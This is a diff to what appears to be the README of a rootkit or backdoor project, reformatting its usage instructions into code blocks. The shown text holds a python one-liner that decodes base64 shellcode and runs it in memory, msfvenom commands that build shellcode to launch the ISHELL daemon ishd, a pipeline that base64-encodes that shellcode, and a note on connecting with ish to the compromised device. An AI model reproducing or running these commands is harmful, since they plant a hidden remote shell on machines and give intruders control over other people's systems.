@@ -19,13 +19,15 @@ python3.11 -c 'import base64, mmap, ctypes; encoded_shellcode = "SDHJSIHp+P///0i
 
 The path to binary here in these examples is hardcoded, but you may go into the ISHELL-v0.3 folder and type 'make linux' or 'make bsd' to build ish and ishd. Then you can make your own shellcode like this:
 
-msfvenom -p linux/x64/exec CMD=/path/to/ishd -f c -b "\x00\x0a\x0d" >
-shellcode.txt
+```
+msfvenom -p linux/x64/exec CMD=/path/to/ishd -f c -b "\x00\x0a\x0d" > shellcode.txt
+```
 
 You can parse out only the shellcode and base64 encode it like this:
 
-grep '"' shellcode.txt | tr "\n" " " | sed -e 's/\" \"//g;s/\"//g;s/;//g'
-&& echo " " | base64
+```
+grep '"' shellcode.txt | tr "\n" " " | sed -e 's/\" \"//g;s/\"//g;s/;//g'&& echo " " | base64
+```
 
 Then you may run ish with the ip of the device the rootkit was ran on to connect.
 
